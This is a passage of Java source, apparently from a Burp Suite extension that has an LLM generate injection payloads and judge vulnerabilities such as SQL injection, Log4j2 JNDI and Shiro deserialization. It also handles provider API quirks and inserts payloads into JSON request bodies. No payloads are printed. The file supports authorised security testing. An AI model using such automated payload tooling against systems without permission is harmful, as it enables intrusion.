        if (vulnType == null) return ScanTask.VulnLevel.HIGH;
        switch (vulnType) {
            case "命令注入":
            case "Fastjson反序列化":
            case "Log4j2 JNDI注入":
            case "Struts2 OGNL注入":
            case "Shiro反序列化":
                return ScanTask.VulnLevel.CRITICAL;
            default:
                return ScanTask.VulnLevel.HIGH;
        }
    }

    private String getHighestVulnTag(List<VulnResult> vulnerabilities) {
        if (vulnerabilities.isEmpty()) {
            return "\u5b89\u5168";
        }
        ScanTask.VulnLevel highest = ScanTask.VulnLevel.NONE;
        String tag = "";
        VulnResult highestVuln = null;
        for (VulnResult vuln : vulnerabilities) {
            if (vuln == null || vuln.getLevel() == null || vuln.getLevel().ordinal() <= highest.ordinal()) continue;
            highest = vuln.getLevel();
            highestVuln = vuln;
        }
        if (highestVuln != null) {
            String vulnTag = highestVuln.getTag();
            String vulnTypeVal = highestVuln.getVulnType();
            String formattedName = this.formatVulnName(vulnTypeVal);
            if (vulnTag != null && !vulnTag.isEmpty() && !vulnTag.equals("未知漏洞") && !vulnTag.equals(vulnTypeVal)) {
                tag = vulnTag;
            } else {
                tag = formattedName;
            }
        }
        return tag;
    }

    private String formatVulnName(String vulnType) {
        if (vulnType == null || vulnType.isEmpty()) {
            return "未知漏洞";
        }
        // Locale.ROOT：默认 Locale 下（如 tr_TR）"sql_injection" 会被转成 "SQL_İNJECTİON"，
        // 类型识别随即静默失败（表格标签、报告标题、修复建议全都跟着错）
        String upper = vulnType.toUpperCase(java.util.Locale.ROOT);
        switch (upper) {
            case "SQL_INJECTION": {
                return "SQL注入";
            }
            case "XSS":
            case "STORED_XSS":
            case "REFLECTED_XSS": {
                return "XSS跨站脚本";
            }
            case "COMMAND_INJECTION":
            case "RCE": {
                return "命令注入";
            }
            case "FILE_UPLOAD":
            case "FILE_UPLOAD_PHP_EXTENSION":
            case "FILE_UPLOAD_PHP":
            case "FILE_UPLOAD_DOUBLE_EXT":
            case "FILE_UPLOAD_NULL_BYTE":
            case "FILE_UPLOAD_CASE_BYPASS":
            case "FILE_UPLOAD_PHTML":
            case "FILE_UPLOAD_HTACCESS":
            case "FILE_UPLOAD_JSP":
            case "FILE_UPLOAD_ASPX":
            case "FILE_UPLOAD_SVG_XSS": {
                return "文件上传";
            }
            case "SSRF": {
                return "SSRF服务端请求伪造";
            }
            case "XXE": {
                return "XXE外部实体注入";
            }
            case "SSTI":
            case "服务端模板注入": {
                return "SSTI服务端模板注入";
            }
            case "FASTJSON":
            case "FASTJSON_DESERIALIZE":
            case "FASTJSON反序列化": {
                return "Fastjson反序列化";
            }
            case "LOG4J2":
            case "LOG4J":
            case "LOG4J2_JNDI":
            case "LOG4J2 JNDI注入": {
                return "Log4j2 JNDI注入";
            }
            case "STRUTS2":
            case "STRUTS2_OGNL":
            case "STRUTS2 OGNL注入": {
                return "Struts2 OGNL注入";
            }
            case "SHIRO":
            case "SHIRO_DESERIALIZE":
            case "SHIRO反序列化": {
                return "Shiro反序列化";
            }
            case "SQL注入":
            case "XSS跨站脚本":
            case "命令注入":
            case "文件上传":
            case "SSRF服务端请求伪造":
            case "XXE外部实体注入":
            case "SSTI服务端模板注入":
            case "Fastjson反序列化":
            case "Log4j2 JNDI注入":
            case "Struts2 OGNL注入":
            case "Shiro反序列化": {
                return vulnType;
            }
            default: {
                return "未知漏洞";
            }
        }
    }
    
    /**
     * 单漏洞模式把报出来的类型钉死在本次扫描的类型上：模型偶尔会把证据归到别的类型
     * （扫 Shiro 却报出一条「SQL注入」），那样表格标签与报告里的修复建议都会串到没测过的类型上。
     * CUSTOM 模式才允许跟着模型的判断走。
     */
    private String resolveVulnType(ScanTask task, String aiVulnType, String defaultType) {
        ScanTask.ScanMode mode = task != null ? task.getScanMode() : null;
        if (mode != null && !mode.isCustom()) {
            String scanned = mode.getDisplayName();
            String normalized = normalizeVulnType(aiVulnType, defaultType);
            if (!scanned.equals(normalized)) {
                this.logPanel.logWarning(Msg.t("log.step5.typeMismatch", Msg.typeNameOf(normalized), Msg.typeNameOf(scanned), Msg.typeNameOf(defaultType)));
            }
            return scanned;
        }
        return normalizeVulnType(aiVulnType, defaultType);
    }

    private String normalizeVulnType(String vulnType, String defaultType) {
        if (vulnType == null || vulnType.isEmpty() || "UNKNOWN".equals(vulnType) || "未知漏洞".equals(vulnType)) {
            return defaultType != null ? defaultType : "UNKNOWN";
        }
        String normalized = formatVulnName(vulnType);
        if ("未知漏洞".equals(normalized) && defaultType != null) {
            return defaultType;
        }
        return normalized;
    }
    
    private JsonObject buildAIRequest(String systemPrompt, String userPrompt) {
        ConfigManager.Config config = ConfigManager.getInstance().getConfig();
        String endpoint = config.getApiEndpoint();
        if (endpoint == null || endpoint.isEmpty()) {
            return null;
        }
        endpoint = endpoint.toLowerCase();
        JsonObject request = new JsonObject();
        request.addProperty("model", config.getSelectedAgent());
        JsonArray messages = new JsonArray();
        AIProvider provider = config.getProviderByName(config.getSelectedProvider());
        int providerMaxTokens = provider != null ? provider.getMaxTokens() : 0;
        // 推理模型的额度不能沿用普通模型那一档：**思维链和可见输出共用这个额度**，
        // 8192 经常被思考吃光，可见输出变空 → JSON 解析失败 → 任务记「分析失败」（一个包都不发）。
        // 也不能按模型天花板上限填（o 系列 100K、gpt-5 128K）：读超时只有 120 秒，
        // 按 30–100 token/秒算，8–12K 就是上限，填更大只会超时。
        // Anthropic 不参与：Claude 不开 thinking 就没有思维链开销，额度给它按普通档算
        // （它的非流式请求本来就建议别超过 16K 输出）。
        boolean anthropic = endpoint.contains("anthropic.com");
        boolean reasoning = !anthropic && isReasoningModel(config.getSelectedAgent());
        int maxTokens = reasoning
                ? REASONING_MAX_OUTPUT_TOKENS
                : Math.min(providerMaxTokens > 0 ? providerMaxTokens : MAX_OUTPUT_TOKENS, MAX_OUTPUT_TOKENS);
        if (anthropic) {
            request.addProperty("system", systemPrompt);
            JsonObject userMsg = new JsonObject();
            userMsg.addProperty("role", "user");
            userMsg.addProperty("content", userPrompt);
            messages.add(userMsg);
            request.add("messages", messages);
            request.addProperty("max_tokens", maxTokens);
            request.addProperty("temperature", 0.3);
        } else {
            JsonObject systemMsg = new JsonObject();
            systemMsg.addProperty("role", "system");
            systemMsg.addProperty("content", systemPrompt);
            messages.add(systemMsg);
            JsonObject userMsg = new JsonObject();
            userMsg.addProperty("role", "user");
            userMsg.addProperty("content", userPrompt);
            messages.add(userMsg);
            request.add("messages", messages);
            // OpenAI 的推理模型（o 系列 / gpt-5 系列）**参数名和采样参数都得换**：拒收 max_tokens
            // （要 max_completion_tokens），也拒收 temperature —— 少改一个照样是 400
            // 「Unsupported parameter」，而症状只是「AI 调用失败」，看不出是参数名的问题
            if (reasoning) {
                request.addProperty("max_completion_tokens", maxTokens);
            } else {
                request.addProperty("temperature", 0.3);
                request.addProperty("max_tokens", maxTokens);
            }
            // 额度不跟着抬：思考确实按 max_tokens 计数（两次实测思考字符数都紧贴 8192×4 = 32768
            // 这条线），说明它是「撑满额度」而不是「刚好想完」—— 抬额度只会让它想得更久，
            // 答案照样可能是空的，还更容易顶到 120 秒读超时。真正的杠杆是**关掉思考**。
            this.applyThinkingControl(request, endpoint, reasoning);
        }
        return request;
    }

    /** 已确认拒收「关思考」参数的端点（小写）。一次 400 后记住，后续请求不再发 */
    private final java.util.Set<String> thinkingControlRejected =
            java.util.concurrent.ConcurrentHashMap.newKeySet();

    /**
     * 「关掉思考」那一组参数 —— **每家的名字都不一样，所以是一张表，不是一个常量。**
     *
     * <p>为什么是「关」而不是「压档位」：实测（2026-09-27，deepseek-flash）思考**确实按
     * max_tokens 计数**，两次的思考字符数是 32100 / 32452，都紧贴 {@code 8192 × 4 = 32768}
     * 这条线 —— 说明它是**撑满**额度，不是刚好想完。所以抬额度、压档位都治不了：模型会跟着
     * 额度一起想得更久，可见答案依旧是空串（{@code reasoning_effort: low} 发出去也没改变结果）。
     *
     * <p>表格依据（2026-09 查证）：DeepSeek 原生 / Kimi K2.6 / 智谱 GLM / MiniMax 都认
     * {@code thinking.type=disabled}；通义 DashScope（含阿里云上托管的 DeepSeek）认
     * {@code enable_thinking=false}；OpenAI 的推理模型与 Gemini Pro **拒收「关」参数**（400），
     * 只能压到 low，所以走 {@code reasoning_effort} 那条路，不发这里的字段；Claude 不主动思考，
     * 不需要关。
     *
     * <p>未知端点（含「自定义」）按多数派的 {@code thinking.type=disabled} 发 —— 兼容的
     * OpenAI 风格端点通常会忽略不认识的字段，而真正拒收的会由 {@link #stripThinkingControl}
     * 兜住：去掉参数重试一次，并记住这个端点。**没有这道兜底，表里任何一格填错都等于该配置下
     * 插件整体不可用**；碰到 GLM-5.3 / kimi-k2.7-code 这类强制思考、关了就报错的模型也靠它。
     */
    private void applyThinkingControl(JsonObject request, String endpoint, boolean openAiReasoning) {
        if (openAiReasoning) {
            // o 系列 / gpt-5：拒收「关」参数（400），能用的最大杠杆就是压到 low。
            // 注意这一支**必须**发 reasoning_effort：它原先写在调用处的 reasoning 分支里，
            // 迁到这里时漏掉过一次，自检当场报红（推理模型少了 reasoning_effort）。
            request.addProperty("reasoning_effort", REASONING_EFFORT);
            return;
        }
        if (endpoint.contains("anthropic.com")) {
            return;   // Claude 不开 thinking 就没有思维链，且它用的是另一套信封
        }
        if (endpoint.contains("//api.openai.com")) {
            // OpenAI 自家（含 gpt-5.x 拒收「关」参数）不认这个字段，别给它塞；
            // 其余 OpenAI 兼容端点走下面的默认值，被拒由 stripThinkingControl 兜底
            return;
        }
        if (this.thinkingControlRejected.contains(this.thinkingControlKey())) {
            return;   // 这个「端点 + 模型」组合拒过一次，别再发
        }
        if (endpoint.contains("dashscope.aliyuncs.com")) {
            request.addProperty("enable_thinking", false);
        } else {
            JsonObject thinking = new JsonObject();
            thinking.addProperty("type", "disabled");
            request.add("thinking", thinking);
        }
    }

    /**
     * 去掉本次请求里的「关思考」参数并记住该端点（HTTP 400 时调用）。
     *
     * @return 真的去掉了一个字段才为 true。第二次调用已无字段可去、返回 false，调用方据此跳出，
     *         不会陷入重试循环
     */
    private boolean stripThinkingControl(JsonObject request) {
        boolean removed = false;
        if (request.remove("thinking") != null) {
            removed = true;
        }
        if (request.remove("enable_thinking") != null) {
            removed = true;
        }
        if (removed) {
            this.thinkingControlRejected.add(this.thinkingControlKey());
        }
        return removed;
    }

    /**
     * 普通模型的输出额度。step3 一次要 9 条载荷（含 XXE / 整段 multipart 那种长载荷），
     * 实测 3–6K token —— 8192 够用，再大只是给跑飞留空间。
     */
    private static final int MAX_OUTPUT_TOKENS = 8192;

    /**
     * 推理模型的输出额度。**思维链与可见输出共用它**，按普通档给（8192）时思考经常把额度吃光，
     * 可见输出变空 → 解析失败 → 任务「分析失败」。
     *
     * <p>16384 是**权衡后的值**，不是模型上限：o 系列上限 100K、gpt-5 是 128K，但这里有个更硬的约束 ——
     * {@code httpClient} 的读超时是 120 秒，按 30–100 token/秒算，8–12K 就到头了，填更大只会超时
     * （超时 = 这次调用白费，验证阶段等于那条载荷没判定）。
     */
    private static final int REASONING_MAX_OUTPUT_TOKENS = 16384;

    /**
     * 推理模型的思考档位。刻意用 {@code low}：medium/high 会把延迟拉长几倍，直接撞上 120 秒读超时，
     * 而且本工具要的是「按给定格式输出 9 条载荷」，不是让模型做长链推理。
     * （不用 {@code minimal}：那是 gpt-5 才有的档位，o 系列会 400。）
     */
    private static final String REASONING_EFFORT = "low";

    /**
     * 是不是 OpenAI 的推理模型（o1/o3/o4 系列、gpt-5 系列）—— 它们要 {@code max_completion_tokens}
     * 且不收 {@code temperature}。
     *
     * <p><b>只能按模型名判，不能按端点判，更不能全局改名</b>：
     * <ul>
     *   <li>同一个 api.openai.com 底下，gpt-4o 要 max_tokens、o3 要 max_completion_tokens；</li>
     *   <li>DeepSeek / Kimi / 智谱 / 通义 / MiniMax 以及 Ollama、vLLM 这类自建端点**只认 max_tokens**，
     *       全局换成 max_completion_tokens 会把它们全砸掉；</li>
     *   <li>gpt-4o / gpt-4.1 两个名字都收，所以对非推理模型保持原样最省事。</li>
     * </ul>
     */
    static boolean isReasoningModel(String model) {
        if (model == null) {
            return false;
        }
        String name = model.trim().toLowerCase(Locale.ROOT);
        if (name.isEmpty()) {
            return false;
        }
        // o1 / o1-mini / o3 / o4-mini …（o 后面直接跟数字，注意别误伤 gpt-4o、omni-*）
        return name.matches("^o\\d.*") || name.startsWith("gpt-5");
    }

    /**
     * 一次失败的 AI 调用会直接吃掉一次检测机会：验证阶段失败 = 这条载荷没被判定（漏报），
     * 步骤3失败 = 整个任务连包都不发（还记成「安全」）。所以对**暂时性**故障重试一次
     * （网络异常、5xx、429、空响应体）；鉴权失败、4xx、没配 Key 这类确定性错误不重试，白等。
     */
    private static final int AI_CALL_ATTEMPTS = 2;

    /** AI 调用失败后、重试前的等待毫秒数（服务端抖动多是瞬时，等一下就过去了） */
    private static final long AI_RETRY_DELAY_MILLIS = 1000L;

    private String callAI(JsonObject requestBody) throws IOException {
        for (int attempt = 1; attempt <= AI_CALL_ATTEMPTS; attempt++) {
            String result = this.callAIOnce(requestBody, attempt);
            if (result != null) {
                return result;
            }
            AiError error = this.getAiError();
            String reason = error != null ? error.reason : null;
            // 「关思考」参数被端点拒收（400：Gemini Pro、gpt-5.x、以及 GLM-5.3 / kimi-k2.7-code
            // 这类强制思考的模型）→ 去掉它重来。这一步修的是**请求形状**、不是网络抖动，所以不占
            // 正常重试次数（attempt 退回去）；stripThinkingControl 第二次返回 false（已无字段可去），
            // 不会死循环。400 若不是这个参数引起的，会照旧失败并在下面返回 null，只是该端点以后
            // 不再收到这个参数 —— 日志里那行写明了原因，便于发现是误判。
            if (error != null && error.httpCode == 400
                    && this.stripThinkingControl(requestBody)) {
                this.logPanel.logWarning(Msg.t("log.ai.thinkingRejected", this.thinkingControlKey()));
                attempt--;
                continue;
            }
            if (attempt < AI_CALL_ATTEMPTS && error != null && error.retryable) {
                this.logPanel.logWarning(Msg.t("log.ai.retry", reason, attempt + 1, AI_CALL_ATTEMPTS));
                try {
                    Thread.sleep(AI_RETRY_DELAY_MILLIS);
                } catch (InterruptedException e) {
                    Thread.currentThread().interrupt();
                    return null;
                }
            } else {
                return null;
            }
        }
        return null;
    }

    /** 一次 AI 调用失败的原因与「值不值得重试」（暂时性故障） */
    private static final class AiError {
        final String reason;
        final boolean retryable;
        /** HTTP 状态码；不是 HTTP 失败（未配置、抛异常等）时为 0 */
        final int httpCode;
        AiError(String reason, boolean retryable, int httpCode) {
            this.reason = reason;
            this.retryable = retryable;
            this.httpCode = httpCode;
        }
    }

    /**
     * 失败原因按**线程**存放：一个 AIEngine 被 10 个扫描线程共用，之前用实例字段当返回值通道，
     * 两个并发的 AI 调用会互相覆盖 —— 该重试的瞬时故障被判成不可重试（载荷直接失去判定机会），
     * 不该重试的确定性失败却重试一次，日志里还是别人的错误原因。
     */
    private final ThreadLocal<AiError> lastAiError = new ThreadLocal<AiError>();

    /**
     * 上一次**验证失败的原因**，同样按线程存放（理由见 {@link #lastAiError}）。
     *
     * <p>调用级失败（网络/HTTP/异常）自己会打日志，不用这个；这里补的是**回复层面**的失败：
     * 拿不到内容字段、或回复里根本没有 JSON。那条路径原本什么日志都不打 —— 于是「模型拒答」
     * 和「传输抖动」在日志里长得一模一样，只能靠反推。有了它，Extender 输出里的一行就能分辨。
     */
    private final ThreadLocal<String> lastVerifyFailReason = new ThreadLocal<String>();

    private void setVerifyFailReason(String reason) {
        this.lastVerifyFailReason.set(reason);
    }

    /** 上一次验证失败的原因；没记录过返回 null */
    private String getVerifyFailReason() {
        return this.lastVerifyFailReason.get();
    }

    /** 单次 AI 调用；失败返回 null 并记下原因与「值不值得重试」 */
    private String callAIOnce(JsonObject requestBody, int attempt) throws IOException {
        ConfigManager.Config config = ConfigManager.getInstance().getConfig();
        if (config.getApiKey() == null || config.getApiKey().trim().isEmpty()) {
            this.reportError(Msg.t("log.api.noKey"));
            this.logPanel.logError(Msg.t("log.api.noKey"));
            this.setAiError("API Key未配置", false);
            return null;
        }
        String endpoint = config.getApiEndpoint();
        if (endpoint == null || endpoint.trim().isEmpty()) {
            this.reportError(Msg.t("log.api.noEndpoint"));
            this.logPanel.logError(Msg.t("log.api.noEndpoint"));
            this.setAiError("API Endpoint未配置", false);
            return null;
        }
        String apiKey = config.getApiKey();
        String requestJson = this.gson.toJson(requestBody);
        RequestBody body = RequestBody.create(JSON_TYPE, requestJson);
        Request.Builder requestBuilder = new Request.Builder().url(endpoint).addHeader("Content-Type", "application/json").post(body);
        AuthHeaders.apply(requestBuilder, endpoint, apiKey);
        try (Response response = this.httpClient.newCall(requestBuilder.build()).execute()) {
            if (!response.isSuccessful()) {
                int code = response.code();
                String msg = response.message();
                String errorBody = response.body() != null ? response.body().string() : "空响应体";
                this.reportError(Msg.t("log.api.httpError", code, msg, errorBody));
                this.logPanel.logError(Msg.t("log.api.httpErrorShort", code, msg)
                        + (attempt < AI_CALL_ATTEMPTS ? Msg.t("log.api.attempt", attempt) : Msg.t("log.api.retryExhausted")));
                this.setAiError("HTTP " + code, code == 429 || code >= 500, code);
                return null;
            }
            if (response.body() == null) {
                this.reportError(Msg.t("log.api.emptyBody"));
                this.logPanel.logError(Msg.t("log.api.emptyBody"));
                this.setAiError("响应体为空", true);
                return null;
            }
            String responseBody = response.body().string();
            return responseBody != null ? responseBody : "";
        } catch (Exception e) {
            this.logPanel.logError(Msg.t("log.api.callException")
                    + (attempt < AI_CALL_ATTEMPTS ? Msg.t("log.api.attempt", attempt) : Msg.t("log.api.retryExhausted")), e);
            this.setAiError(e.getClass().getSimpleName() + (e.getMessage() != null ? ": " + e.getMessage() : ""), true);
            return null;
        }
    }

    private void setAiError(String reason, boolean retryable) {
        this.setAiError(reason, retryable, 0);
    }

    private void setAiError(String reason, boolean retryable, int httpCode) {
        this.lastAiError.set(new AiError(reason, retryable, httpCode));
    }

    /**
     * 往 Burp 的 Extender 输出报错。**callbacks 允许为 null**（离线 harness 就是
     * {@code new AIEngine(null, null, logPanel, null)} 这么构造的），所以必须判空：
     * 不判空时 HTTP 错误分支会抛 NPE、被外层 catch 吞掉，把真正的失败原因换成一条
     * 「NullPointerException」——HTTP 状态码就此丢失，靠状态码判断的兜底逻辑会静默失效。
     */
    private void reportError(String message) {
        if (this.callbacks != null) {
            this.callbacks.printError(message);
        }
    }

    /**
     * 「关思考」兜底的键：**端点 + 模型**，不是只按端点。
     *
     * <p>只按端点在「同一端点换模型」时会出错：某个模型拒收该参数（比如强制思考的那种）会把
     * 整个端点标记成拒收，于是同端点下**本来认这个参数**的模型也跟着不再发 —— 思考回来，
     * 空答案的问题就复发了。键只活在内存里（见 {@link #thinkingControlRejected}）。
     */
    private String thinkingControlKey() {
        ConfigManager.Config config = ConfigManager.getInstance().getConfig();
        String endpoint = config.getApiEndpoint();
        String model = config.getSelectedAgent();
        return (endpoint == null ? "" : endpoint.trim().toLowerCase(Locale.ROOT))
                + "|" + (model == null ? "" : model.trim().toLowerCase(Locale.ROOT));
    }

    private AiError getAiError() {
        return this.lastAiError.get();
    }


    private String extractJsonFromContent(String content) {
        if (content == null || content.trim().isEmpty()) {
            return null;
        }
        String trimmed = content.trim();
        if (trimmed.startsWith("```json")) {
            trimmed = trimmed.substring(7);
        } else if (trimmed.startsWith("```")) {
            trimmed = trimmed.substring(3);
        }
        if (trimmed.endsWith("```")) {
            trimmed = trimmed.substring(0, trimmed.length() - 3);
        }
        trimmed = trimmed.trim();
        int jsonStart = -1;
        int jsonEnd = -1;
        for (int i = 0; i < trimmed.length(); i++) {
            if (trimmed.charAt(i) == '{') {
                jsonStart = i;
                break;
            }
        }
        if (jsonStart == -1) {
            return null;
        }
        int braceCount = 0;
        boolean inString = false;
        boolean escaped = false;
        for (int i = jsonStart; i < trimmed.length(); i++) {
            char c = trimmed.charAt(i);
            if (escaped) {
                escaped = false;
                continue;
            }
            if (c == '\\') {
                escaped = true;
                continue;
            }
            if (c == '"') {
                inString = !inString;
                continue;
            }
            if (inString) continue;
            if (c == '{') {
                braceCount++;
            } else if (c == '}') {
                braceCount--;
                if (braceCount == 0) {
                    jsonEnd = i + 1;
                    break;
                }
            }
        }
        if (jsonEnd > jsonStart) {
            return trimmed.substring(jsonStart, jsonEnd);
        }
        int lastBrace = trimmed.lastIndexOf("}");
        if (lastBrace > jsonStart) {
            return trimmed.substring(jsonStart, lastBrace + 1);
        }
        return trimmed.substring(jsonStart);
    }
    
    private String findStringField(JsonObject obj, String... fieldNames) {
        if (obj == null) return null;
        for (String name : fieldNames) {
            if (obj.has(name) && !obj.get(name).isJsonNull() && obj.get(name).isJsonPrimitive()) {
                try {
                    return obj.get(name).getAsString();
                } catch (Exception e) {
                }
            }
        }
        return null;
    }
    
    /**
     * 读一个布尔字段，认 {@code true/false} 与 {@code "true"/"1"/"yes"/"on"}（反之为 false）。
     *
     * <p><b>词表必须自己判</b>：{@code JsonPrimitive.getAsBoolean()} 对非布尔的 primitive
     * <b>从不抛异常</b>，它就是 {@code Boolean.parseBoolean(getAsString())} —— 于是 {@code "1"}、
     * {@code "yes"}、{@code "on"} 全部静默变成 false。以前这段词表写在 catch 分支里（以为是
     * "getAsBoolean 会抛、抛了再兜底"），而外层又已限定 {@code isJsonPrimitive()}，
     * 那个 catch 是**死代码** —— 模型用 yes/on 回答时漏洞被读成「不存在」，整条判负。
     *
     * <p>认不出来的写法返回 null（继续看下一个别名字段），调用方把 null 当 false。
     */
    private Boolean findBooleanField(JsonObject obj, String... fieldNames) {
        if (obj == null) return null;
        for (String name : fieldNames) {
            if (!obj.has(name) || obj.get(name).isJsonNull() || !obj.get(name).isJsonPrimitive()) continue;
            JsonElement elem = obj.get(name);
            if (elem.getAsJsonPrimitive().isBoolean()) {
                return elem.getAsBoolean();
            }
            String strVal = elem.getAsString();
            if (strVal == null) continue;
            String lower = strVal.trim().toLowerCase(java.util.Locale.ROOT);
            if (lower.equals("true") || lower.equals("1") || lower.equals("yes") || lower.equals("on")) {
                return true;
            }
            if (lower.equals("false") || lower.equals("0") || lower.equals("no") || lower.equals("off")) {
                return false;
            }
        }
        return null;
    }
    
    /**
     * 宽容地取数组：模型把数组写成字符串/对象是常事，而 {@code getAsJsonArray()} 对类型不符**会抛**，
     * 一抛就让**整份回复**作废（被外层 catch 成 null）→ 走「分析失败」+ 一个包都不发，
     * 用户还会以为是 AI 的问题。这里与 {@link #normalizeVerifyResponse} 的宽容风格对齐。
     *
     * <ul>
     *   <li>数组 → 原样返回</li>
     *   <li>单项对象（{@code {"param":…}}、{@code {"position":…,"payload":…}}）→ 包成单元素数组</li>
     *   <li>以参数名为键的对象（{@code {"username":["SQL注入"]}}）→ 展开成多项，键补成 {@code param}</li>
     *   <li>primitive → 包成单元素数组（非对象项由调用方的类型判断跳过，不会当有效载荷）</li>
     *   <li>缺失 / {@code null} → {@code null}，与「字段不存在」同一语义</li>
     * </ul>
     */
    private static JsonArray asArrayLenient(JsonElement elem) {
        if (elem == null || elem.isJsonNull()) return null;
        if (elem.isJsonArray()) return elem.getAsJsonArray();
        JsonArray arr = new JsonArray();
        if (elem.isJsonObject()) {
            JsonObject obj = elem.getAsJsonObject();
            boolean singleItem = obj.has("param") || obj.has("position") || obj.has("payload")
                    || obj.has("type") || obj.has("vulnTypes");
            if (singleItem) {
                arr.add(obj);
                return arr;
            }
            for (java.util.Map.Entry<String, JsonElement> entry : obj.entrySet()) {
                JsonElement value = entry.getValue();
                if (value == null || value.isJsonNull()) continue;
                JsonObject item = new JsonObject();
                item.addProperty("param", entry.getKey());
                if (value.isJsonObject()) {
                    for (java.util.Map.Entry<String, JsonElement> inner : value.getAsJsonObject().entrySet()) {
                        item.add(inner.getKey(), inner.getValue());
                    }
                } else {
                    item.add("vulnTypes", value.isJsonArray() ? value : wrapOne(value));
                }
                arr.add(item);
            }
            return arr.size() > 0 ? arr : null;
        }
        arr.add(elem);
        return arr;
    }

    private static JsonArray wrapOne(JsonElement elem) {
        JsonArray one = new JsonArray();
        one.add(elem);
        return one;
    }

    private Integer findIntField(JsonObject obj, String... fieldNames) {
        if (obj == null) return null;
        for (String name : fieldNames) {
            if (!obj.has(name) || obj.get(name) == null || obj.get(name).isJsonNull() || !obj.get(name).isJsonPrimitive()) continue;
            try {
                return obj.get(name).getAsInt();
            } catch (Exception e) {
                // 字符串形态按**数值**解析：以前是 replaceAll("[^0-9]","")，会把 "9.5" 变成 95、
                // "95.5" 变成 955 —— 模型给出的 9.5% 判断被放大 10 倍直接越过报告门限（误报），
                // 而同一个值不写引号时走 getAsInt() 截断成 9（不报）：两种写法两个结论。
                Integer parsed = parseIntLoose(obj.get(name).getAsString());
                if (parsed != null) {
                    return parsed;
                }
                // 解析不出来就继续看下一个别名，别整条放弃
            }
        }
        return null;
    }

    /** 宽松整数解析：容忍小数与百分号，取整数部分（9.5% → 9）；解析不了返回 null */
    private static Integer parseIntLoose(String raw) {
        if (raw == null) return null;
        String cleaned = raw.trim().replace("%", "").replace("％", "");
        if (cleaned.isEmpty()) return null;
        try {
            return (int) Double.parseDouble(cleaned);
        } catch (Exception e) {
            return null;
        }
    }

    /** 置信度归一化到 0-100：模型偶尔给出 "95.5" 这类越界值，日志里出现「置信度 955%」就是从这里漏出去的 */
    private static int clampConfidence(Integer value) {
        if (value == null) return 0;
        return Math.max(0, Math.min(100, value));
    }
    
    private String safeGetString(JsonObject obj, String key, String defaultValue) {
        if (obj == null || key == null || !obj.has(key) || obj.get(key) == null || obj.get(key).isJsonNull()) {
            return defaultValue;
        }
        try {
            return obj.get(key).getAsString();
        }
        catch (Exception e) {
            return defaultValue;
        }
    }

    private String getContentType(IRequestInfo requestInfo) {
        List<String> headers = requestInfo.getHeaders();
        for (String header : headers) {
            if (!header.toLowerCase().startsWith("content-type:")) continue;
            return header.substring(header.indexOf(":") + 1).trim();
        }
        return null;
    }

    /** JSON 位置路径的一段：name[3] 形式；name 可为空（顶层数组的 [0]） */
    private static class JsonPathSegment {
        final String name;
        final int index;
        JsonPathSegment(String name, int index) {
            this.name = name;
            this.index = index;
        }
    }

    /** 解析 user.id / items[0].name / [0].id 形式的位置路径（不引入新依赖） */
    private static List<JsonPathSegment> parseJsonPath(String path) {
        List<JsonPathSegment> segments = new ArrayList<>();
        if (path == null || path.isEmpty()) return segments;
        for (String rawPart : path.split("\\.")) {
            String part = rawPart.trim();
            if (part.isEmpty()) continue;
            int bracket = part.indexOf('[');
            if (bracket < 0) {
                segments.add(new JsonPathSegment(part, -1));
                continue;
            }
            String name = part.substring(0, bracket).trim();
            java.util.regex.Matcher matcher = java.util.regex.Pattern
                    .compile("\\[(\\d+)\\]")
                    .matcher(part.substring(bracket));
            if (matcher.find()) {
                segments.add(new JsonPathSegment(name, Integer.parseInt(matcher.group(1))));
            } else {
                segments.add(new JsonPathSegment(name, -1));
            }
        }
        return segments;
    }

    /** 按路径取值；任一段不存在返回 null */
    private static JsonElement jsonPathGet(JsonObject root, List<JsonPathSegment> segments) {
        JsonElement current = root;
        for (JsonPathSegment seg : segments) {
            if (current == null || current.isJsonNull()) return null;
            if (!seg.name.isEmpty()) {
                if (!current.isJsonObject()) return null;
                JsonObject obj = current.getAsJsonObject();
                if (!obj.has(seg.name)) return null;
                current = obj.get(seg.name);
            }
            if (seg.index >= 0) {
                if (current == null || !current.isJsonArray()) return null;
                JsonArray arr = current.getAsJsonArray();
                if (seg.index >= arr.size()) return null;
                current = arr.get(seg.index);
            }
        }
        return current;
    }

    /** 按路径写回（只替换已存在的叶子，不新建中间节点）；成功返回 true */
    private static boolean jsonPathSet(JsonObject root, List<JsonPathSegment> segments, JsonElement value) {
        if (segments.isEmpty()) return false;
        JsonElement current = root;
        for (int i = 0; i < segments.size(); ++i) {
            JsonPathSegment seg = segments.get(i);
            boolean isLast = i == segments.size() - 1;
            if (!seg.name.isEmpty()) {
                if (current == null || !current.isJsonObject()) return false;
                JsonObject obj = current.getAsJsonObject();
                if (!obj.has(seg.name)) return false;
                if (isLast && seg.index < 0) {
                    obj.add(seg.name, value);
                    return true;
                }
                current = obj.get(seg.name);
            } else if (isLast && seg.index < 0) {
                return false;
            }
            if (seg.index >= 0) {
                if (current == null || !current.isJsonArray()) return false;
                JsonArray arr = current.getAsJsonArray();
                if (seg.index >= arr.size()) return false;
                if (isLast) {
                    arr.set(seg.index, value);
                    return true;
                }
                current = arr.get(seg.index);
            }
        }
        return false;
    }

    private JsonObject tryParseJsonObject(String text) {
        if (text == null) return null;
        String trimmed = text.trim();
        if (!trimmed.startsWith("{")) return null;
        try {
            JsonElement parsed = this.gson.fromJson(trimmed, JsonElement.class);
            return parsed != null && parsed.isJsonObject() ? parsed.getAsJsonObject() : null;
        }
        catch (Exception e) {
            return null;
        }
    }

    /** 用新的 body 替换请求体并修正 Content-Length（统一 UTF-8） */
    private byte[] buildRequestWithBody(byte[] originalRequest, int bodyOffset, String newBody) {
        byte[] newBodyBytes = newBody.getBytes(StandardCharsets.UTF_8);
        byte[] newRequest = new byte[bodyOffset + newBodyBytes.length];
        System.arraycopy(originalRequest, 0, newRequest, 0, bodyOffset);
        System.arraycopy(newBodyBytes, 0, newRequest, bodyOffset, newBodyBytes.length);
        return this.updateContentLength(newRequest, newBodyBytes.length);
    }

    /**
     * JSON 注入：支持顶层键与 user.id / items[0].name 形式的嵌套路径。
     * 路径不存在时返回 null（不再退化成「改写第一个顶层原始值键」——那会把载荷投进错误的参数）。
     */
    private byte[] modifyJsonRequest(byte[] originalRequest, String payload, String position, IRequestInfo requestInfo) {
        try {
            int bodyOffset = requestInfo.getBodyOffset();
            if (bodyOffset < 0 || bodyOffset > originalRequest.length) return null;
            String body = new String(originalRequest, bodyOffset, originalRequest.length - bodyOffset, StandardCharsets.UTF_8);
            JsonObject jsonBody;
            try {
